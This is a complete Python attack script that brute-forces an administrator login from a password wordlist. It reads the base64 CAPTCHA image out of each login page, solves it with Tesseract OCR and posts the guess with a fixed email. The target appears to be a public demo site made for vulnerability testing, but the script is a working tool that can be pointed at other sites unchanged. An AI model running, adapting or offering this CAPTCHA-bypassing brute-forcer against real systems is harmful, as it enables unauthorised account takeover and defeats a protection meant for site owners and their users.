import requests
import pytesseract
from PIL import Image
import base64
import io
import re
import argparse

def decode_captcha(base64_captcha):
    try:
        captcha_data = base64_captcha.split(",")[1]
        image_data = base64.b64decode(captcha_data)
        image = Image.open(io.BytesIO(image_data))
        captcha_text = pytesseract.image_to_string(image, config="--psm 8").strip()
        captcha_text = re.sub(r"[^a-zA-Z0-9]", "", captcha_text)
        return captcha_text
    except Exception as e:
        print(f"Error decoding CAPTCHA: {e}")
        return None

def fetch_captcha(session, url):
    try:
        response = session.get(url)
        if response.status_code == 200:
            # extract the b64 CAPTCHA from the page source
            start = response.text.find("data:image/png;base64,")
            if start == -1:
                print("CAPTCHA not found in the page source.")
                return None

            end = response.text.find('"', start)
            base64_captcha = response.text[start:end]
            return base64_captcha
        else:
            print(f"Failed to fetch CAPTCHA. HTTP Status: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error fetching CAPTCHA: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="Bypass CAPTCHA authentication.")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the password wordlist.")
    args = parser.parse_args()

    login_url = "http://aspnet.testsparker.com/administrator/Login.aspx?r=%2fDashboard%2f&newAuth=1"
    email = "alan@turing.com"
    session = requests.Session()

    try:
        with open(args.wordlist, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print("Wordlist file not found.")
        return

    for password in passwords:
        # fetch the CAPTCHA dynamically
        base64_captcha = fetch_captcha(session, login_url)
        if not base64_captcha:
            print("Failed to retrieve CAPTCHA. Exiting.")
            break

        # decode CAPTCHA
        captcha_text = decode_captcha(base64_captcha)
        if not captcha_text:
            print("Failed to decode CAPTCHA. Skipping this attempt.")
            continue

        print(f"Extracted CAPTCHA: {captcha_text}")

        data = {
            "__VIEWSTATE": "/wEPDwUJMjQ5MTUxNTk1ZGR7SoZRZsldR0XCCBJ8b6HK3VNxZbwNpnWqw2kHQS3GdA==",
            "__VIEWSTATEGENERATOR": "163CF246",
            "ctl00$contentCenterMenu$login_C_S_R_F_inLoginDetected$Email": email,
            "ctl00$contentCenterMenu$login_C_S_R_F_inLoginDetected$Password": password,
            "ctl00$contentCenterMenu$login_C_S_R_F_inLoginDetected$Captcha": captcha_text,
            "ctl00$contentCenterMenu$login_C_S_R_F_inLoginDetected$Button1": "Sign in",
        }

        response = session.post(login_url, data=data)
        print(f"Trying password: {password}")

        if "Hello Admin" in response.text or "Location" in response.headers:
            print(f"Login successful! Password: {password}")
            break
        else:
            print("Login failed.\n")

if __name__ == "__main__":
    main()
